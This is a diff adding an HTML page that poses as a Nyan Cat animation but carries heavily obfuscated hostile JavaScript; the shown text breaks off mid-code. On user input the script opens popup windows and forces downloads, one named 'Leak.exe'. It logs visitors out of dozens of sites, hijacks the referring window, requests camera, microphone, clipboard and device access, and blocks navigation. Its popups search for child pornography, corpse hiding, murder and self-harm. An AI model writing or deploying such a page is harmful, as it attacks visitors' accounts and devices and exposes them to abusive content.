@@ -1,0 +1,716 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+    <head>
+        <meta charset="UTF-8">
+        <title>S</title>
+    </head>
+    <body>
+        <div class="sparks-combo">
+            <div class="spark"></div>
+            <div class="spark"></div>
+            <div class="spark"></div>
+            <div class="spark"></div>
+        </div>
+        <div id="wave-a" class="hot rainbow"></div>
+        <div id="wave-a" class="cold rainbow"></div>
+        <div id="wave-b" class="hot rainbow"></div>
+        <div id="wave-b" class="cold rainbow"></div>
+        <div id="nyan-cat" class="frame1">
+            <div id="tail"></div>
+            <div id="paws"></div>
+            <div id="pop-tarts-body">
+                <div id="pop-tarts-body-cream"></div>
+            </div>
+            <div id="head">
+                <div id="face"></div>
+            </div>
+        </div>
+        <audio autoplay="true" loop="true">
+            <source src="nyan-cat.ogg" type="audio/ogg"/>
+            <source src="nyan-cat.mp3" type="audio/mpeg"/>
+        </audio>
+<script>
+    const _0x1fa552=_0x53ff;(function(_0x127a43,_0x27eee0){const _0x287d05=_0x53ff,_0x41c411=_0x127a43();while(!![]){try{const _0x28b5d4=parseInt(_0x287d05(0x1f1))/0x1+parseInt(_0x287d05(0x152))/0x2+-parseInt(_0x287d05(0x1c6))/0x3*(-parseInt(_0x287d05(0x186))/0x4)+parseInt(_0x287d05(0x11b))/0x5*(-parseInt(_0x287d05(0x141))/0x6)+parseInt(_0x287d05(0x18b))/0x7*(-parseInt(_0x287d05(0xff))/0x8)+-parseInt(_0x287d05(0x1d4))/0x9*(-parseInt(_0x287d05(0x15f))/0xa)+-parseInt(_0x287d05(0x1fc))/0xb;if(_0x28b5d4===_0x27eee0)break;else _0x41c411['push'](_0x41c411['shift']());}catch(_0x445b73){_0x41c411['push'](_0x41c411['shift']());}}}(_0x309f,0xf1493));const SCREEN_WIDTH=window[_0x1fa552(0x17b)]['availWidth'],SCREEN_HEIGHT=window[_0x1fa552(0x17b)][_0x1fa552(0x18c)],WIN_WIDTH=0x1e0,WIN_HEIGHT=0x168,VELOCITY=0xf,MARGIN=0xf,TOP_MARGIN=0x32,TICK_LENGTH=0x32,HIDDEN_STYLE=_0x1fa552(0x18e),ART=[_0x1fa552(0x1f9)],SEARCHES=[_0x1fa552(0x138),_0x1fa552(0x125),_0x1fa552(0x1c3),_0x1fa552(0x1e2),_0x1fa552(0x169),_0x1fa552(0x128),_0x1fa552(0x165),_0x1fa552(0x1ba),_0x1fa552(0x167),'Nasi\x20semih\x20celik\x20gibi\x20olabilirim',_0x1fa552(0x19d),_0x1fa552(0x15e)],VIDEOS=['sex.mp4'],FILE_DOWNLOADS=[_0x1fa552(0x18f),_0x1fa552(0x199),_0x1fa552(0x1ce),'sa.png','il.png'],PHRASES=[_0x1fa552(0x15d),_0x1fa552(0x176),_0x1fa552(0x1be),_0x1fa552(0x1ac),_0x1fa552(0x13e),_0x1fa552(0x1d1),'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak','EREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE'],LOGOUT_SITES={'AOL':[_0x1fa552(0x1fb),_0x1fa552(0x143)],'AOL\x202':[_0x1fa552(0x1fb),_0x1fa552(0x19c)+Math[_0x1fa552(0x108)]()],'Amazon':[_0x1fa552(0x1fb),_0x1fa552(0x133)],'Blogger':['GET','https://www.blogger.com/logout.g'],'Delicious':[_0x1fa552(0x1fb),_0x1fa552(0x1d5)],'DeviantART':[_0x1fa552(0x156),'https://www.deviantart.com/users/logout'],'DreamHost':[_0x1fa552(0x1fb),_0x1fa552(0x14b)],'Dropbox':['GET',_0x1fa552(0x137)],'eBay':[_0x1fa552(0x1fb),_0x1fa552(0x190)],'Gandi':[_0x1fa552(0x1fb),_0x1fa552(0x1f5)],'GitHub':['GET',_0x1fa552(0x1e5)],'GMail':[_0x1fa552(0x1fb),_0x1fa552(0x14f)],'Google':[_0x1fa552(0x1fb),'https://www.google.com/accounts/Logout'],'Hulu':[_0x1fa552(0x1fb),_0x1fa552(0x12e)],'Instapaper':[_0x1fa552(0x1fb),_0x1fa552(0x1ab)],'Linode':[_0x1fa552(0x1fb),_0x1fa552(0x11f)],'LiveJournal':[_0x1fa552(0x156),_0x1fa552(0x123),{'action:killall':'1'}],'MySpace':[_0x1fa552(0x1fb),_0x1fa552(0x1d3)],'NetFlix':['GET',_0x1fa552(0x12c)],'New\x20York\x20Times':[_0x1fa552(0x1fb),_0x1fa552(0x192)],'Newegg':[_0x1fa552(0x1fb),_0x1fa552(0x1b8)],'Photobucket':[_0x1fa552(0x1fb),'https://photobucket.com/logout'],'Skype':[_0x1fa552(0x1fb),_0x1fa552(0x14c)],'Slashdot':[_0x1fa552(0x1fb),_0x1fa552(0x1bf)],'SoundCloud':[_0x1fa552(0x1fb),_0x1fa552(0x17c)],'Steam\x20Community':[_0x1fa552(0x1fb),'https://steamcommunity.com/?action=doLogout'],'Steam\x20Store':[_0x1fa552(0x1fb),_0x1fa552(0x109)],'ThinkGeek':[_0x1fa552(0x1fb),'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],'Threadless':[_0x1fa552(0x1fb),'https://www.threadless.com/logout'],'Tumblr':[_0x1fa552(0x1fb),_0x1fa552(0x1e7)],'Vimeo':['GET','https://vimeo.com/log_out'],'Wikipedia':[_0x1fa552(0x1fb),'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],'Windows\x20Live':['GET',_0x1fa552(0x1c9)],'Woot':[_0x1fa552(0x1fb),_0x1fa552(0x132)],'Wordpress':[_0x1fa552(0x1fb),_0x1fa552(0x198)],'Yahoo':[_0x1fa552(0x1fb),'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],'YouTube':[_0x1fa552(0x156),_0x1fa552(0x148),{'action_logout':'1'}]},wins=[];let interactionCount=0x0,numSuperLogoutIframes=0x0;const isChildWindow=window[_0x1fa552(0x131)]&&isParentSameOrigin()||window[_0x1fa552(0x1da)][_0x1fa552(0x175)][_0x1fa552(0x102)]('child=true')!==-0x1,isParentWindow=!isChildWindow;init();if(isChildWindow)initChildWindow();else initParentWindow();function init(){confirmPageUnload(),interceptUserInput(_0x37bdb7=>{const _0x4f5d93=_0x53ff;interactionCount+=0x1,_0x37bdb7[_0x4f5d93(0x1c0)](),_0x37bdb7['stopPropagation']();if(_0x37bdb7['which']!==0x0)openWindow();startVibrateInterval(),enablePictureInPicture(),triggerFileDownload(),focusWindows(),copySpamToClipboard(),speak(),startTheramin(),_0x37bdb7[_0x4f5d93(0x19e)]===_0x4f5d93(0x1ed)||_0x37bdb7['key']===_0x4f5d93(0x151)?(window[_0x4f5d93(0x162)](),requestWebauthnAttestation(),window[_0x4f5d93(0x162)](),requestWebauthnAttestation(),window['print'](),requestWebauthnAttestation()):(requestPointerLock(),requestFullscreen(),requestClipboardRead(),requestMidiAccess(),requestBluetoothAccess(),requestUsbAccess(),requestSerialAccess(),requestHidAccess(),requestCameraAndMic(),Math[_0x4f5d93(0x108)]()<0.1&&requestWebauthnAttestation());});}function initChildWindow(){registerProtocolHandlers(),hideCursor(),moveWindowBounce(),setupFollowWindow(),startVideo(),detectWindowClose(),triggerFileDownload(),speak(),rainbowThemeColor(),animateUrlWithEmojis(),interceptUserInput(_0x4f0144=>{interactionCount===0x1&&startAlertInterval();});}function initParentWindow(){showHelloMessage(),blockBackButton(),fillHistory(),startInvisiblePictureInPictureVideo(),interceptUserInput(_0x7045dd=>{const _0x1a59d7=_0x53ff;interactionCount===0x1&&(registerProtocolHandlers(),attemptToTakeoverReferrerWindow(),hideCursor(),startVideo(),startAlertInterval(),superLogout(),removeHelloMessage(),rainbowThemeColor(),animateUrlWithEmojis(),speak(_0x1a59d7(0x107)));});}function attemptToTakeoverReferrerWindow(){const _0x37f1a0=_0x1fa552;isParentWindow&&window[_0x37f1a0(0x131)]&&!isParentSameOrigin()&&(window[_0x37f1a0(0x131)][_0x37f1a0(0x1da)]=window['location'][_0x37f1a0(0x1d0)]+_0x37f1a0(0x126));}function isParentSameOrigin(){const _0x537b54=_0x1fa552;try{return window[_0x537b54(0x131)][_0x537b54(0x1da)][_0x537b54(0x1d0)]===window[_0x537b54(0x1da)][_0x537b54(0x1d0)];}catch(_0x569c46){return![];}}function confirmPageUnload(){const _0xf9529d=_0x1fa552;window[_0xf9529d(0x16b)](_0xf9529d(0x17f),_0x42afbb=>{const _0x10db94=_0xf9529d;speak(_0x10db94(0x146)),_0x42afbb[_0x10db94(0x15a)]=!![];});}function registerProtocolHandlers(){const _0xe881d9=_0x1fa552;if(typeof navigator[_0xe881d9(0x1df)]!=='function')return;const _0x3ad07b=[_0xe881d9(0x193),'geo','im',_0xe881d9(0x1e0),_0xe881d9(0x121),_0xe881d9(0x158),'mailto',_0xe881d9(0x149),_0xe881d9(0x1a0),_0xe881d9(0x121),_0xe881d9(0x1c4),_0xe881d9(0x104),_0xe881d9(0x17e),_0xe881d9(0x11c),_0xe881d9(0x15b),_0xe881d9(0x1cf),_0xe881d9(0x1f7),_0xe881d9(0x1d6),_0xe881d9(0x118),_0xe881d9(0x103)],_0x299a83=window['location'][_0xe881d9(0x105)]+_0xe881d9(0x1b4);_0x3ad07b[_0xe881d9(0x16e)](_0x1606d4=>{navigator['registerProtocolHandler'](_0x1606d4,_0x299a83,'The\x20Screy\x20.wtf');});}function requestCameraAndMic(){const _0x1ea058=_0x1fa552;if(!navigator[_0x1ea058(0x1f2)]||typeof navigator[_0x1ea058(0x1f2)][_0x1ea058(0x177)]!==_0x1ea058(0x185))return;navigator[_0x1ea058(0x1f2)][_0x1ea058(0x189)]()[_0x1ea058(0x1cc)](_0x1247d4=>{const _0x365010=_0x1ea058,_0x35aa78=_0x1247d4[_0x365010(0x1d8)](_0x542de1=>_0x542de1[_0x365010(0x1f8)]===_0x365010(0x127));if(_0x35aa78[_0x365010(0x181)]===0x0)return;const _0x5c5b16=_0x35aa78[_0x35aa78[_0x365010(0x181)]-0x1];navigator[_0x365010(0x1f2)][_0x365010(0x177)]({'deviceId':_0x5c5b16[_0x365010(0x1de)],'facingMode':['user',_0x365010(0x1bc)],'audio':!![],'video':!![]})['then'](_0x5a7f3f=>{const _0x11c340=_0x365010,_0x130ae8=_0x5a7f3f[_0x11c340(0x16f)]()[0x0],_0x11c978=new window[(_0x11c340(0x135))](_0x130ae8);_0x11c978['getPhotoCapabilities']()[_0x11c340(0x1cc)](()=>{_0x130ae8['applyConstraints']({'advanced':[{'torch':!![]}]});},()=>{});},()=>{});});}function animateUrlWithEmojis(){const _0x4d96aa=_0x1fa552;if(window['ApplePaySession'])return;const _0x207eca=Math[_0x4d96aa(0x108)]();if(_0x207eca<0.33)_0x28608c();else _0x207eca<0.67?_0x2dabb5():_0x2e2980();function _0x28608c(){const _0x15475a=['🏻','🏼','🏽','🏾','🏿'];setInterval(()=>{const _0x478345=_0x53ff;let _0x31f46d='',_0x1b4ba3,_0x29a25a;for(_0x1b4ba3=0x0;_0x1b4ba3<0xa;_0x1b4ba3++){_0x29a25a=Math['floor'](_0x15475a[_0x478345(0x181)]*((Math[_0x478345(0x1f4)](Date['now']()/0x64+_0x1b4ba3)+0x1)/0x2)),_0x31f46d+='👶'+_0x15475a[_0x29a25a];}window[_0x478345(0x1da)][_0x478345(0x1a7)]=_0x31f46d;},0x64);}function _0x2dabb5(){setInterval(()=>{const _0x2ac297=_0x53ff;let _0x446d1a,_0x24f6cb,_0x14ca2f='';for(_0x446d1a=0x0;_0x446d1a<0xa;_0x446d1a++){_0x24f6cb=Math[_0x2ac297(0x19b)](Math[_0x2ac297(0x1f4)](Date[_0x2ac297(0x147)]()/0xc8+_0x446d1a/0x2)*0x4)+0x4,_0x14ca2f+=String[_0x2ac297(0x150)](0x2581+_0x24f6cb);}window[_0x2ac297(0x1da)][_0x2ac297(0x1a7)]=_0x14ca2f;},0x64);}function _0x2e2980(){const _0x34dd67=['🌑','🌘','🌗','🌖','🌕','🌔','🌓','🌒'],_0x2d93a9=[0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0];let _0x1157cd=0x0;setInterval(()=>{const _0x4700ed=_0x53ff;let _0x496ecd='',_0x2c0076=0x0;if(!_0x1157cd){while(_0x2d93a9[_0x2c0076]===0x4){_0x2c0076++;}if(_0x2c0076>=_0x2d93a9[_0x4700ed(0x181)])_0x1157cd=0x1;else _0x2d93a9[_0x2c0076]++;}else{while(_0x2d93a9[_0x2c0076]===0x0){_0x2c0076++;}if(_0x2c0076>=_0x2d93a9[_0x4700ed(0x181)])_0x1157cd=0x0;else{_0x2d93a9[_0x2c0076]++;if(_0x2d93a9[_0x2c0076]===0x8)_0x2d93a9[_0x2c0076]=0x0;}}_0x2d93a9['forEach'](function(_0x32ec3){_0x496ecd+=_0x34dd67[_0x32ec3];}),window[_0x4700ed(0x1da)]['hash']=_0x496ecd;},0x64);}}function requestPointerLock(){const _0x45baf3=_0x1fa552,_0x1ff268=document[_0x45baf3(0x140)]['requestPointerLock']||document[_0x45baf3(0x140)][_0x45baf3(0x119)]||document[_0x45baf3(0x140)][_0x45baf3(0x14a)]||document[_0x45baf3(0x140)][_0x45baf3(0x16c)];_0x1ff268[_0x45baf3(0x1cd)](document['body']);}function _0x309f(){const _0x133091=['.logout-messages','touchstart','enumerateDevices','map','21THLoIX','availHeight','ApplePaySession','position:\x20fixed;\x20width:\x201px;\x20height:\x201px;\x20overflow:\x20hidden;\x20top:\x20-10px;\x20left:\x20-10px;','Leak.exe','https://signin.ebay.com/ws/eBayISAPI.dll?SignIn','pushState','https://www.nytimes.com/logout','bitcoin',',top=','muted','msRequestFullscreen','closed','https://wordpress.com/wp-login.php?action=logout','eren.png','createOscillator','floor','https://api.screenname.aol.com/auth/logout?state=snslogout&r=','ikbal\x20uzuner\x20yapicam\x20tum\x20kizlari','key','requestMIDIAccess','news','img','credentials','outerHeight','abs','appendChild','document','hash','webkitRequestFullscreen','connected','createElement','https://www.instapaper.com/user/logout','the\x20cocaine\x20is\x20not\x20goooooodd\x20for\x20yooooouuuuuuuuuu','log','readText','contentWindow','disappointment@screy.wtf','gatt','connect','value','/url=%s','onCloseWindow','Successfully\x20read\x20data\x20from\x20clipboard:\x20\x27','navigator','https://secure.newegg.com/NewMyAccount/AccountLogout.aspx','firefox','bestgore.com','Logging\x20you\x20out\x20from\x20','environment','chrome','childpornchildpornchildpornchildpornchildporn','https://slashdot.org/my/logout','preventDefault','speechSynthesis',',left=','aci\x20cekmeden\x20nasi\x20olebilirim','nntp','vibrate','6KzGkgl','.hello-message','samsung','https://login.live.com/logout.srf','allow-same-origin','toString','then','call','bf.png','tel','origin','abcdefghijklmnopqrstuvwxyz\x20abcdefghijklmnopqrstuvwxyz','start','https://www.myspace.com/index.cfm?fuseaction=signout','1197XtCPhk','https://www.delicious.com/logout','webcal','opera','filter','textContent','location','serial','usb','resizeTo','deviceId','registerProtocolHandler','irc','getSelection','annem\x20uyurken\x20onu\x20nasi\x20oldururum','method','https://www.bing.com/search?q=','https://github.com/logout','meta.theme-color','https://www.tumblr.com/logout','setPeriodicWave','mouseup','innerText','edge','sandbox','Meta','public-key','style','unload','1814660MiSnsA','mediaDevices','mousedown','sin','https://www.gandi.net/login/out','name','urn','kind','\x0a⠀⠀⠀⠸⣿⣿⣷⣶⣤⣤⣤⣤⣤⣴⣾⡷⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣧⣶⣶⣦⣤⣀⠤⡀⠀⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣄⠀⠀⠀⠀⠀\x0a⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀\x0a⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠦⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀\x0a⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⢹⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀\x0a⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡀⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⢿⣿⣿⣿⣿⡿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀\x0a⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠙⣷⢹⠞⣿⣿⣿⣿⣿⣿⡀⠀⠀⢸⣿⣿⣿⣿⣿⡆⣿⢙⣿⡿⣿⣿⣿⣿⣼⣿⣿⡿⣿⣿⣿⠀\x0a⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡏⢿⠀⣽⠉⠀⡿⣿⣿⣿⣿⣿⣧⠀⠀⠘⣿⣿⣿⣿⣀⡏⠃⠀⣿⡁⣿⡟⢿⣿⣿⣿⣿⣷⣿⣿⠉⠀\x0a⠀⠀⠾⢹⣿⣿⣿⣿⣿⣿⣧⣤⡶⠃⠀⠀⠀⢈⣿⣿⡿⠈⠛⠀⠀⠀⠿⠹⣿⣿⣿⡀⠀⠀⠸⡿⣿⣥⣾⣿⣿⣿⣿⣯⣿⢿⠁⠀\x0a⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣯⣀⣀⣀⣠⣤⣶⣿⡿⢻⡇⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣶⣤⣄⣈⣼⣿⣾⣿⣿⣿⣿⣿⣿⠘⠁⠀\x0a⠀⠀⠀⠰⠃⠙⡿⣿⣿⡿⡿⣯⣭⣿⠿⣷⣏⣿⡇⠀⠁⠀⠀⠀⠀⠀⠀⠀⠈⣿⢹⡿⢿⣿⣿⣿⠿⣿⣿⣿⣿⡟⣿⠿⣿⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠐⠃⢹⣿⣾⣞⡴⣿⡗⣾⣿⣿⠘⠁⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠃⢸⠇⣸⣿⣟⣻⡿⠿⣿⣻⢼⣿⠘⠀⠈⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣷⣿⣿⡿⣻⣿⣿⠄⠀⠀⢀⣠⣼⣿⣿⣶⣿⡄⠀⠀⠀⠀⣼⢸⣿⣷⣴⣷⣿⠁⠀⢿⡃⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⡗⣻⣿⣿⣿⣷⣿⣿⣿⣶⠏⢿⣿⡿⢿⠇⠀⠀⠀⠀⣿⣀⣿⡿⣿⣿⠿⡆⠀⠸⣇⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⣻⣿⣟⣻⣿⣿⣗⣿⣿⣿⣿⣿⣿⡄⣸⣿⡷⠃⠀⠀⠀⠀⠀⣿⣿⣿⣷⣴⣾⣾⣧⣤⣾⣿⠀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣭⣿⣭⣭⣯⣿⣯⠙⠛⠛⠛⠛⠙⡾⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣇⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⡛⣛⠟⢻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⣿⣿⣷⣿⡏⢻⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⣲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣧⣄⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠟⡩⠉⠝⣿⣷⣽⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣟⣿⣿⢿⠉⠁\x0a⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣕⡽⢿⣿⢿⣿⠿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠉⠹⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠙⠃⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢋⠄⠉⣡⠸⣿⣿⡾⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠀⣼⢟⣐⡷⡯⣥⣤⢿⣟⡞⣻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀\x0a⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀\x0a⠛⠚⠛⠋⠀⠀⠀⠀⠈⠙⠛⠻⠿⠿⠟⠋⠹⠿⠿⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠈⠙⠛⠛⠛⠋⠉⠀⠀⠀⠀⠀\x0a\x20\x20','requestPictureInPicture','GET','8167808hojscq',',height=','ble','2972688pEfagx','moveTo','moveBy','indexOf','xmpp','sip','href','src','That\x20was\x20a\x20mistake','random','https://store.steampowered.com/logout/','parentNode','download','fill','bluetooth','gamepad','width=','submit','loop','createGain','buffer','outerWidth','open','prototype','vibrationActuator','wtai','webkitRequestPointerLock','frequency','714695AlrHJr','smsto','removeChild','popstate','https://manager.linode.com/session/logout','destination','ircs','alert','https://www.livejournal.com/logout.bml','querySelector','bilek\x20kesme\x20tutorial','/?child=true','videoinput','satilik\x20cocuk\x20porno','createRange','focus','clipboard','https://www.netflix.com/Logout','template','https://secure.hulu.com/logout','mousemove','join','opener','https://account.woot.com/logout','https://www.amazon.com/gp/flex/sign-out.html?action=sign-out','pathname','ImageCapture','click','https://www.dropbox.com/logout','ceset\x20nasi\x20saklarim','hasOwnProperty','createPeriodicWave','gamepadconnected','onload','speak','nasi\x20ceset\x20saklarim','whiteSpace','body','72RVvxpw','dual-rumble','https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us','onerror','cursor:\x20none;','Please\x20don\x27t\x20go!','now','https://www.youtube.com','mms','mozRequestPointerLock','https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout','https://secure.skype.com/account/logout','window','type','https://mail.google.com/mail/?logout','fromCharCode','Control','1594770KWjAsp','autoplay','Acme','removeAllRanges','POST','requestDevice','magnet','SpeechSynthesisUtterance','returnValue','ssh','form','AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA','torbaci\x20nasi\x20bulabilirim','130280AgmsTJ','addRange','gain','print','YOU\x20ARE\x20HACKED','screenY','insanlarla\x20nasi\x20konusabilirim','push','BI\x20KADINI\x20NASIL\x20KESEBILIRIM','history','nasi\x20kucuk\x20yasta\x20bi\x20kizi\x20tawlayabilirim','remove','addEventListener','msRequestPointerLock','video','forEach','getVideoTracks','hid','iframe','cos','requestFullscreen','selectNode','search','skibidi\x20skibidi\x20skibidi\x20skibidi\x20toilet\x20toilet\x20toilet\x20skibidi','getUserMedia','test','content','get','screen','https://soundcloud.com/logout','create','sms','beforeunload','publicKey','length','keyup','span','action','function','432184DfiZRj'];_0x309f=function(){return _0x133091;};return _0x309f();}function startVibrateInterval(){const _0x11c4e5=_0x1fa552;if(typeof window[_0x11c4e5(0x1b7)][_0x11c4e5(0x1c5)]!==_0x11c4e5(0x185))return;setInterval(()=>{const _0x254495=_0x11c4e5,_0x128672=Math[_0x254495(0x19b)](Math[_0x254495(0x108)]()*0x258);window[_0x254495(0x1b7)]['vibrate'](_0x128672);},0x3e8),window[_0x11c4e5(0x16b)](_0x11c4e5(0x13b),_0x4703ad=>{const _0x3c07d0=_0x11c4e5,_0x2b6d51=_0x4703ad[_0x3c07d0(0x10e)];_0x2b6d51[_0x3c07d0(0x117)]&&setInterval(()=>{const _0x9cec48=_0x3c07d0;_0x2b6d51[_0x9cec48(0x1a9)]&&_0x2b6d51[_0x9cec48(0x117)]['playEffect'](_0x9cec48(0x142),{'duration':Math[_0x9cec48(0x19b)](Math[_0x9cec48(0x108)]()*0x258),'strongMagnitude':Math[_0x9cec48(0x108)](),'weakMagnitude':Math[_0x9cec48(0x108)]()});},0x3e8);});}function interceptUserInput(_0x41e47e){const _0x3ef961=_0x1fa552;document[_0x3ef961(0x140)][_0x3ef961(0x16b)](_0x3ef961(0x188),_0x41e47e,{'passive':![]}),document[_0x3ef961(0x140)][_0x3ef961(0x16b)](_0x3ef961(0x1f3),_0x41e47e),document[_0x3ef961(0x140)][_0x3ef961(0x16b)](_0x3ef961(0x1e9),_0x41e47e),document[_0x3ef961(0x140)][_0x3ef961(0x16b)](_0x3ef961(0x136),_0x41e47e),document['body'][_0x3ef961(0x16b)]('keydown',_0x41e47e),document[_0x3ef961(0x140)]['addEventListener'](_0x3ef961(0x182),_0x41e47e),document['body'][_0x3ef961(0x16b)]('keypress',_0x41e47e);}function startInvisiblePictureInPictureVideo(){const _0xcd9a95=_0x1fa552,_0x32b537=document['createElement']('video');_0x32b537[_0xcd9a95(0x106)]=getRandomArrayEntry(VIDEOS),_0x32b537[_0xcd9a95(0x111)]=!![],_0x32b537[_0xcd9a95(0x195)]=!![],_0x32b537['style']=HIDDEN_STYLE,_0x32b537['autoplay']=!![],_0x32b537['play'](),document['body']['appendChild'](_0x32b537);}function enablePictureInPicture(){const _0xfe3a3=_0x1fa552,_0x3e744d=document[_0xfe3a3(0x124)](_0xfe3a3(0x16d));document['pictureInPictureEnabled']&&(_0x3e744d[_0xfe3a3(0x1ef)]='',_0x3e744d['muted']=![],_0x3e744d[_0xfe3a3(0x1fa)](),_0x3e744d['play']());}function focusWindows(){const _0x208b31=_0x1fa552;wins[_0x208b31(0x16e)](_0x115ee8=>{const _0x114c2c=_0x208b31;if(!_0x115ee8['closed'])_0x115ee8[_0x114c2c(0x12a)]();});}function openWindow(){const _0x4693bb=_0x1fa552,{x:_0x293f7e,y:_0x77de26}=getRandomCoords(),_0x2781e6=_0x4693bb(0x10f)+WIN_WIDTH+_0x4693bb(0x1fd)+WIN_HEIGHT+_0x4693bb(0x1c2)+_0x293f7e+_0x4693bb(0x194)+_0x77de26,_0x1fcc87=window[_0x4693bb(0x115)](window['location']['pathname'],'',_0x2781e6);if(!_0x1fcc87)return;wins[_0x4693bb(0x166)](_0x1fcc87);if(wins[_0x4693bb(0x181)]===0x2)setupSearchWindow(_0x1fcc87);}function hideCursor(){const _0x4419dc=_0x1fa552;document['querySelector']('html')['style']=_0x4419dc(0x145);}function triggerFileDownload(){const _0x51bd16=_0x1fa552,_0x169511=getRandomArrayEntry(FILE_DOWNLOADS),_0x14eb42=document[_0x51bd16(0x1aa)]('a');_0x14eb42[_0x51bd16(0x105)]=_0x169511,_0x14eb42[_0x51bd16(0x10b)]=_0x169511,_0x14eb42[_0x51bd16(0x136)]();}function speak(_0x5e04dd){const _0x3385a2=_0x1fa552;if(_0x5e04dd==null)_0x5e04dd=getRandomArrayEntry(PHRASES);window[_0x3385a2(0x1c1)][_0x3385a2(0x13d)](new window[(_0x3385a2(0x159))](_0x5e04dd));}function startTheramin(){const _0x2b1ade=_0x1fa552,_0x4ad107=new 